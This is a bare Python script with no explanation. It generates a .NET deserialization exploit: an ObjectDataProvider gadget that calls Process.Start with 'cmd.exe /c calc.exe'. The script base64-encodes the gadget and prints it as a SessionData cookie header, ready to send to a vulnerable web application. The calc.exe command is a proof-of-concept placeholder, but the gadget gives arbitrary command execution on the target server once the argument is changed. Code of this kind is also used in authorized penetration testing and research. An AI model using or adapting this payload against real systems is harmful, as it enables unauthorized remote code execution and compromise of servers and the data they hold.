import json
import base64

def generate_payload():
    payload = {
  "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "ObjectInstance": {
    "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "StartInfo": {
      "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}

    payload_json = json.dumps(payload)
    payload_base64 = base64.b64encode(payload_json.encode()).decode()

    return payload_base64

def main():
    payload_b64 = generate_payload()
    print("Cookie: SessionData=" + payload_b64)

if __name__ == "__main__":
    main()
